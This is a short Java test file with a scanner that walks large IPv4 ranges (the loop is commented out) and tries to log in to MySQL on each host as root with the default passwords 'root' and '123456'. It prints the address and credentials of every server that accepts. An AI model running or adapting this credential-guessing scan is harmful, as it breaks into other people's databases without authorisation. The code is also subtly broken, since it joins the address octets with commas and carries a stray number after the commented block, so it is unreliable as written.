package com.dazhumei.love.test;

import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Test {

//	public static void main(String[] args) throws SQLException{
//		for(int i=119;i<255;i++){
//			for(int l=23;l<255;l++){
//				for(int m=31;m<255;m++){
//					for(int n=100;n<255;n++){
//						StringBuffer ip=new StringBuffer();
//						ip.append(i).append(",").append(l).append(",").append(m).append(",").append(n);
//						getConnect(ip.toString());
//						System.out.println(ip.toString()+"连不上。。。");
//					}
//				}
//			}
//		}
//	}3976
	
	public static void getConnect(String ip) throws SQLException {
		Connection con = null;
		String url = "jdbc:mysql://"+ip+":3306/mysql";
		String root = "root";
		String password = "root";
		
		try {
			Class.forName("com.mysql.jdbc.Driver");
			con = DriverManager.getConnection(url, root, password); // 连接MSSQL
		} catch (Exception e) {
			getConnectTest(url);
		}finally {
			if(con!=null){
				System.out.println(url);
				System.out.println("root");
				System.out.println("root");
				con.close();
			}
		}
	}
	
	public static void getConnectTest(String url) throws SQLException {
		Connection con2 = null;
		try {
			Class.forName("com.mysql.jdbc.Driver");
			con2 = DriverManager.getConnection(url, "root", "123456"); // 连接MSSQL
		} catch (Exception e) {
			
		}finally {
			if(con2!=null){
				System.out.println(url);
				System.out.println("root");
				System.out.println("123456");
				con2.close();
			}

		}
	}
}
